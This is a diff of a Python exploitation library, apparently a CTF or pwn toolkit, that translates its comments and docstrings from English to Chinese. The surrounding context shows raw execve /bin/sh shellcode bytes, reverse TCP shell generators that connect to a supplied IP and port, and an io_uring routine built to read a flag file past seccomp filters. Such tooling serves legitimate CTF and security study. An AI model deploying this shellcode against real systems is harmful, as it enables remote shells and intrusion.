@@ -19,7 +19,7 @@ __all__ = [
 
 
 class ShellcodeMall:
-    # most of these shellcode from http://shell-storm.org/shellcode/
+    # 这些 shellcode 多数来自 http://shell-storm.org/shellcode/
     class amd64:
         __all_execve_bin_sh = {
             27: b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05",
@@ -50,7 +50,7 @@ class ShellcodeMall:
 
         @staticmethod
         def reverse_tcp_connect(ip: str, port: int) -> bytes:
-            # from http://shell-storm.org/shellcode/files/shellcode-907.php
+            # 来自 http://shell-storm.org/shellcode/files/shellcode-907.php
             """
             /* socket(AF_INET, SOCK_STREAM, 0) */
             socket:
@@ -85,7 +85,7 @@ class ShellcodeMall:
 
         @staticmethod
         def reverse_tcp_shell(ip: str, port: int) -> bytes:
-            # from http://shell-storm.org/shellcode/files/shellcode-907.php
+            # 来自 http://shell-storm.org/shellcode/files/shellcode-907.php
             """
             /* socket(AF_INET, SOCK_STREAM, 0) */
             socket:
@@ -136,19 +136,19 @@ class ShellcodeMall:
 
         @staticmethod
         def io_uring_cat_flag(filename: str = "/flag", fd: int = 1) -> bytes:
-            """Read a file via io_uring and write to fd, bypassing seccomp that
-            blocks open/openat/openat2. Uses io_uring OPENAT + READ + WRITE SQEs.
+            """通过 io_uring 读取文件并写入 fd，绕过阻止 open/openat/openat2 的 seccomp。
+            使用 io_uring 的 OPENAT + READ + WRITE SQE。
 
             Args:
-                filename: Path to read (default "/flag")
-                fd: File descriptor to write output to (default 1 = stdout)
+                filename: 待读取的路径（默认 "/flag"）
+                fd: 写入输出的文件描述符（默认 1 = stdout）
 
             Returns:
-                Assembled shellcode bytes (amd64)
+                汇编后的 shellcode 字节（amd64）
             """
             old_ctx = context.arch
             context.arch = "amd64"
-            # Encode filename with null terminator, pad to 8-byte alignment
+            # 文件名以 null 结尾编码，填充至 8 字节对齐
             fname_bytes = filename.encode() + b"\x00"
             fname_len = len(fname_bytes)
 
@@ -164,7 +164,7 @@ class ShellcodeMall:
             lea r12, [rsp+0x70]     /* r12 = buffer for read data */
             """
 
-            # Write filename bytes to stack at [rsp+0x6a]
+            # 将文件名字节写入栈上 [rsp+0x6a] 处
             offset = 0x6a
             for i in range(0, fname_len, 8):
                 chunk = fname_bytes[i:i+8].ljust(8, b'\x00')
@@ -173,7 +173,7 @@ class ShellcodeMall:
                     sc += f"    mov rax, {hex(val)}\n"
                     sc += f"    mov QWORD PTR [rsp+{hex(offset + i)}], rax\n"
                 else:
-                    # Partial write for remaining bytes
+                    # 对剩余字节进行部分写入
                     remaining = fname_len - i
                     if remaining >= 4:
                         sc += f"    mov DWORD PTR [rsp+{hex(offset + i)}], {hex(val & 0xffffffff)}\n"
@@ -426,10 +426,10 @@ class ShellcodeMall:
 
     @staticmethod
     def generate_payload_for_connect(ip: str, port: int) -> bytes:
-        """connect(socket_fd, buf, 0x10), generate payload of buf
-        
+        """connect(socket_fd, buf, 0x10)，生成 buf 的 payload
+
         assert len(buf) == 0x10
-        
+
         """
         int_ip = 0
         for i in ip.strip().split("."):
@@ -441,13 +441,13 @@ class ShellcodeMall:
 
 
 def shellcode2unicode(shellcode: str or bytes) -> str:
-    """Switch a shellcode to unicode-form, like: 'a' --> '\\x61'
+    """将 shellcode 转换为 unicode 形式，如：'a' --> '\\x61'
 
     Args:
-        shellcode (str, bytes): shellcode.
+        shellcode (str, bytes): shellcode。
 
     Returns:
-        str: string with '\\x'.
+        str: 带 '\\x' 的字符串。
 
     Example:
         >>> s = shellcode2unicode('abcd')
